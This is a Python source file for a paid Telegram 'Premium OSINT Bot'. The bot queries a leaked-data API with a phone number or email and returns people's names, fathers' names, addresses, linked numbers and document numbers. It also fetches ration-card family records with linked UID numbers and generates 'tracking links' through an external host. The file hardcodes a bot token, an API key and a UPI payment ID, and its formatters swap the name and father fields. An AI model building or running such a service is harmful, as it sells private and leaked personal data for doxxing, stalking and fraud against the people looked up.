# bot.py — PTB v20.3 + Flask + Render (background asyncio loop)
import os
import re
import json
import logging
import urllib.parse
import requests
import asyncio
import threading
from flask import Flask, request

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
)

# ================== CONFIG =====================

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8285505523:AAEoJgpBpVeUEErcseSSeCIEb0MwNAZ_5qM")
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "https://advance-osint-zii6.onrender.com")

API_KEY = os.environ.get("API_KEY", "5785818477:QqPj82nd")
LEAK_API = os.environ.get("LEAK_API", "https://leakosintapi.com/")
FAMILY_API = os.environ.get("FAMILY_API", "https://encore.toxictanji0503.workers.dev/family?id=")

LANG = "ru"
LIMIT = 300

UPI_ID = "durgeshraihero@oksbi"
QR_IMAGE = "https://i.ibb.co/S6nfK15/upi.jpg"
ADMIN_ID = int(os.environ.get("ADMIN_ID", "6314556756"))

COST_LOOKUP = 50
COST_FAMILY = 20
COST_TRACK = 10

RENDER_LINK = os.environ.get("RENDER_LINK", "https://jsjs-kzua.onrender.com")

user_balances = {}

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ================== FLASK APP =====================

app = Flask(__name__)
telegram_app = None
telegram_loop = None  # background loop reference


@app.route("/")
def home():
    return "Bot Running."


@app.route("/health")
def health():
    return "OK"


@app.route("/webhook", methods=["POST"])
def webhook():
    """Receive Telegram update from webhook (Flask thread) and forward it to PTB loop."""
    global telegram_app, telegram_loop
    if telegram_app is None or telegram_loop is None:
        return "Bot not ready", 503

    try:
        update = Update.de_json(request.get_json(force=True), telegram_app.bot)
        # schedule processing on the background loop
        future = asyncio.run_coroutine_threadsafe(telegram_app.process_update(update), telegram_loop)
        # optionally wait a short time if you want to ensure it was scheduled (not required)
        return "OK"
    except Exception as e:
        logger.exception(f"WEBHOOK ERROR: {e}")
        return "OK", 200


# ================== HELPERS =====================

def chunk(text, size=3500):
    return [text[i:i + size] for i in range(0, len(text), size)]


def normalize_phone(txt):
    s = re.sub(r"[^0-9]", "", txt)
    if len(s) == 10:
        return "+91" + s
    if len(s) == 11 and s.startswith("0"):
        return "+91" + s[1:]
    if len(s) == 12 and s.startswith("91"):
        return "+" + s
    if len(s) == 13 and s.startswith("+91"):
        return s
    return None


def google_maps_link(address):
    return "https://www.google.com/maps/search/" + urllib.parse.quote(address or "")


def whatsapp_check(number):
    return f"https://wa.me/{number.replace('+','')}" if number else ""


def make_tracking_link(uid, site):
    return f"{RENDER_LINK}/?chat_id={uid}&site={urllib.parse.quote(site)}"


# ================== API CALLS =====================

def leak_raw(query):
    try:
        r = requests.post(
            LEAK_API,
            json={
                "token": API_KEY,
                "request": query,
                "limit": LIMIT,
                "lang": LANG
            },
            timeout=20
        )
        return r.json()
    except Exception as e:
        return {"error": str(e)}


def family_raw(fid):
    try:
        r = requests.get(FAMILY_API + fid, timeout=20)
        return r.json()
    except Exception as e:
        return {"error": str(e)}


# ================== FORMATTERS =====================

def format_lookup(entry):
    name = (entry.get("FatherName") or "N/A").title()
    father = (entry.get("FullName") or "N/A").title()

    address = entry.get("Address", "")
    maps = google_maps_link(address)
    region = (entry.get("Region", "")).replace(";", " / ")
    doc = entry.get("DocNumber", "N/A")

    phones = []
    for k, v in entry.items():
        if "phone" in k.lower() and v:
            p = str(v)
            if len(p) == 10:
                p = "+91" + p
            phones.append(p)

    phone_block = "\n".join([f"• {p}" for p in phones]) or "Not Available"
    wa = whatsapp_check(phones[0]) if phones else ""

    return (
        "📱 <b>Phone Intelligence Report</b>\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        f"👤 <b>Name:</b> {name}\n"
        f"👨‍👦 <b>Father’s Name:</b> {father}\n\n"
        f"🏠 <b>Address:</b>\n{address}\n\n"
        f"🗺 <b>Maps:</b> <a href='{maps}'>Open Location</a>\n\n"
        f"🌐 <b>Region:</b> {region}\n\n"
        f"📞 <b>Linked Numbers:</b>\n{phone_block}\n\n"
        f"💬 <b>WhatsApp:</b> <a href='{wa}'>Check WhatsApp</a>\n\n"
        f"🧾 <b>Document:</b> {doc}\n"
        "━━━━━━━━━━━━━━━━━━"
    )


def format_list(raw):
    out = "📱 <b>Phone Intelligence Report</b>\n━━━━━━━━━━━━━━━━━━\n\n"
    for db_name, block in raw.get("List", {}).items():
        out += f"🗂 <b>Database:</b> {db_name}\n"
        for i, entry in enumerate(block.get("Data", []), 1):
            name = (entry.get("FatherName") or "N/A").title()
            father = (entry.get("FullName") or "N/A").title()
            address = entry.get("Address", "")
            region = (entry.get("Region", "")).replace(";", " / ")
            maps = google_maps_link(address)
            doc = entry.get("DocNumber", "N/A")

            phones = []
            for k, v in entry.items():
                if "phone" in k.lower() and v:
                    p = str(v)
                    if len(p) == 10:
                        p = "+91" + p
                    phones.append(p)

            phone_block = "\n".join([f"• {p}" for p in phones]) or "Not Available"
            wa = whatsapp_check(phones[0]) if phones else ""

            out += (
                f"\n<b>{i}) Record</b>\n"
                f"👤 <b>Name:</b> {name}\n"
                f"👨‍👦 <b>Father:</b> {father}\n\n"
                f"🏠 <b>Address:</b>\n{address}\n\n"
                f"🗺 <b>Maps:</b> <a href='{maps}'>Open</a>\n\n"
                f"🌐 <b>Region:</b> {region}\n\n"
                f"📞 <b>Phones:</b>\n{phone_block}\n\n"
                f"💬 <b>WhatsApp:</b> <a href='{wa}'>Check</a>\n\n"
                f"🧾 <b>Document:</b> {doc}\n"
                "━━━━━━━━━━━━━━━━━━\n"
            )
    return out


def format_family(data):
    head = (
        "👨‍👩‍👧‍👦 <b>Family Intelligence Report</b>\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        f"🏠 <b>State:</b> {data.get('homeStateName','N/A')}\n"
        f"📍 <b>District:</b> {data.get('homeDistName','N/A')}\n"
        f"🆔 <b>Ration Card:</b> {data.get('rcId','N/A')}\n"
        f"📦 <b>Scheme:</b> {data.get('schemeName','N/A')}\n\n"
    )

    body = ""
    for i, m in enumerate(data.get("memberDetailsList", []), 1):
        body += (
            f"{i}) 👤 <b>{m.get('memberName','N/A').title()}</b>\n"
            f"   ┗ 🔗 Relation: {m.get('releationship_name','N/A')}\n"
            f"   ┗ 🆔 UID Linked: {m.get('uid','N/A')}\n\n"
        )

    return head + body + "━━━━━━━━━━━━━━━━━━"


# ================== SAFE SENDERS =====================

async def safe_reply(update, text, **kwargs):
    chat = update.message or (update.callback_query and update.callback_query.message)
    if chat:
        return await chat.reply_text(text, **kwargs)
    else:
        logger.warning("safe_reply: no chat found for update")
        return None


async def safe_photo(update, photo, **kwargs):
    chat = update.message or (update.callback_query and update.callback_query.message)
    if chat:
        return await chat.reply_photo(photo, **kwargs)
    else:
        logger.warning("safe_photo: no chat found for update")
        return None


# ================== COMMANDS =====================

async def start(update: Update, context):
    await safe_reply(
        update,
        "👋 <b>Welcome to Premium OSINT Bot</b>\nChoose an option:",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔍 Lookup", callback_data="lookup")],
            [InlineKeyboardButton("👪 Family Info", callback_data="family")],
            [InlineKeyboardButton("🌍 Track Website", callback_data="track")],
            [InlineKeyboardButton("💳 Add Balance", callback_data="buy")],
            [InlineKeyboardButton("💰 Check Balance", callback_data="balance")],
        ])
    )


async def buy(update, context):
    await safe_photo(
        update,
        QR_IMAGE,
        caption=(
            "💳 <b>Recharge Credits</b>\n\n"
            f"Lookup ₹{COST_LOOKUP} | Family ₹{COST_FAMILY} | Track ₹{COST_TRACK}\n"
            f"UPI: <code>{UPI_ID}</code>"
        ),
        parse_mode="HTML"
    )


async def balance(update, context):
    uid = update.effective_user.id
    bal = user_balances.get(uid, 0)
    await safe_reply(update, f"💰 Your balance: <b>{bal}</b>", parse_mode="HTML")


async def approve(update, context):
    if update.effective_user.id != ADMIN_ID:
        return await safe_reply(update, "❌ Unauthorized.")
    try:
        args = context.args or []
        uid = int(args[0])
        amt = int(args[1])
        user_balances[uid] = user_balances.get(uid, 0) + amt
        await safe_reply(update, f"✔ Added {amt} credits to {uid}")
    except Exception:
        await safe_reply(update, "Usage: /approve <id> <amt>")


async def button(update: Update, context):
    q = update.callback_query
    await q.answer()

    if q.data == "lookup":
        context.user_data["lookup"] = True
        return await safe_reply(update, "📥 Send phone number or email:")

    if q.data == "family":
        context.user_data["family"] = True
        return await safe_reply(update, "👪 Send Family ID:")

    if q.data == "track":
        context.user_data["track"] = True
        return await safe_reply(update, "🌍 Send Website URL:")

    if q.data == "buy":
        return await buy(update, context)

    if q.data == "balance":
        return await balance(update, context)


async def handle_message(update: Update, context):
    uid = update.effective_user.id
    text = (update.message.text or "").strip()

    phone_auto = normalize_phone(text)
    email_auto = re.fullmatch(r"[\w.-]+@[\w.-]+\.\w+", text)

    if phone_auto or email_auto:
        context.user_data["lookup"] = True

    if context.user_data.pop("lookup", False):
        phone = normalize_phone(text)
        email = email_auto

        if not phone and not email:
            return await safe_reply(update, "❌ Invalid number/email.")

        if user_balances.get(uid, 0) < COST_LOOKUP:
            return await safe_reply(update, "❌ Not enough credits.")

        user_balances[uid] -= COST_LOOKUP
        await safe_reply(update, "⏳ Fetching OSINT data...")

        raw = leak_raw(phone if phone else email.group())

        if isinstance(raw, dict) and any(k in raw for k in ["FullName", "FatherName", "Address"]):
            msg = format_lookup(raw)
            for c in chunk(msg):
                await safe_reply(update, c, parse_mode="HTML")
            return

        if "List" in raw:
            msg = format_list(raw)
            for c in chunk(msg):
                await safe_reply(update, c, parse_mode="HTML")
            return

        pretty = "<pre>" + json.dumps(raw, indent=2, ensure_ascii=False) + "</pre>"
        for c in chunk(pretty):
            await safe_reply(update, c, parse_mode="HTML")
        return

    if context.user_data.pop("family", False):
        if user_balances.get(uid, 0) < COST_FAMILY:
            return await safe_reply(update, "❌ Not enough credits.")

        user_balances[uid] -= COST_FAMILY
        await safe_reply(update, "⏳ Fetching family info...")

        raw = family_raw(text)

        if "memberDetailsList" in raw:
            msg = format_family(raw)
            for c in chunk(msg):
                await safe_reply(update, c, parse_mode="HTML")
            return

        pretty = "<pre>" + json.dumps(raw, indent=2, ensure_ascii=False) + "</pre>"
        for c in chunk(pretty):
            await safe_reply(update, c, parse_mode="HTML")
        return

    if context.user_data.pop("track", False):
        if user_balances.get(uid, 0) < COST_TRACK:
            return await safe_reply(update, "❌ Not enough credits.")

        user_balances[uid] -= COST_TRACK
        link = make_tracking_link(uid, text)

        return await safe_reply(
            update,
            f"🔗 Your Tracking Link:\n<code>{link}</code>",
            parse_mode="HTML"
        )

    await safe_reply(update, "Use /start to open menu.")


# ================== TELEGRAM BACKGROUND LOOP =====================

def start_telegram_background(app_obj):
    """
    Create a dedicated asyncio loop in a background thread, initialize PTB application,
    set webhook and start the application. Returns the loop object.
    """
    loop = asyncio.new_event_loop()

    def _run():
        asyncio.set_event_loop(loop)
        try:
            # initialize the application (loads handlers, etc.)
            loop.run_until_complete(app_obj.initialize())

            # set webhook on the bot in this loop
            webhook_url = f"{WEBHOOK_URL.rstrip('/')}/webhook"
            loop.run_until_complete(app_obj.bot.delete_webhook(drop_pending_updates=True))
            loop.run_until_complete(app_obj.bot.set_webhook(webhook_url))
            logger.info(f"Webhook SET: {webhook_url}")

            # start the application (this starts the dispatcher and job queue etc.)
            loop.create_task(app_obj.start())

            # keep the loop running forever to serve tasks scheduled via run_coroutine_threadsafe(...)
            loop.run_forever()
        except Exception:
            logger.exception("Exception in telegram background loop")
        finally:
            try:
                loop.run_until_complete(app_obj.stop())
                loop.run_until_complete(app_obj.shutdown())
            except Exception:
                pass

    t = threading.Thread(target=_run, daemon=True)
    t.start()
    return loop


# ================== MAIN =====================

def main():
    global telegram_app, telegram_loop

    telegram_app = ApplicationBuilder().token(BOT_TOKEN).build()

    telegram_app.add_handler(CommandHandler("start", start))
    telegram_app.add_handler(CommandHandler("buy", buy))
    telegram_app.add_handler(CommandHandler("balance", balance))
    telegram_app.add_handler(CommandHandler("approve", approve))
    telegram_app.add_handler(CallbackQueryHandler(button))
    telegram_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # start telegram application in background loop (this also sets webhook)
    try:
        telegram_loop = start_telegram_background(telegram_app)
    except Exception:
        logger.exception("Failed to start telegram background loop.")
        telegram_loop = None

    # start Flask (synchronous) to receive webhooks
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)


if __name__ == "__main__":
    main()
